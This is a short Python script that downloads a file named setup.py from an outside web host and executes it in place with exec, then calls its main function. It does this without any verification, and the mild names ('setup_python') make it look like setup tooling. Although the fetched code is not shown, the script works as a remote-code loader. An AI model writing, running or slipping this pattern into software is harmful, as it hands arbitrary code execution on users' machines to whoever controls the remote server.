import sys
import types
import urllib.request

def getUrl():
    return "https://web.webfiles.com/tmp/setup.py"

def getModuleName():
    return "setup_python"

def getSource(url):
    with urllib.request.urlopen(url) as response:
        return response.read().decode('utf-8')

def main():
    url = getUrl()
    moduleName = getModuleName()

    source = getSource(url)
    mod = types.ModuleType(moduleName)
    sys.modules[moduleName] = mod
    exec(source, mod.__dict__)

    try:
        mod.main()
    except Exception as e:
        print(e)

main()
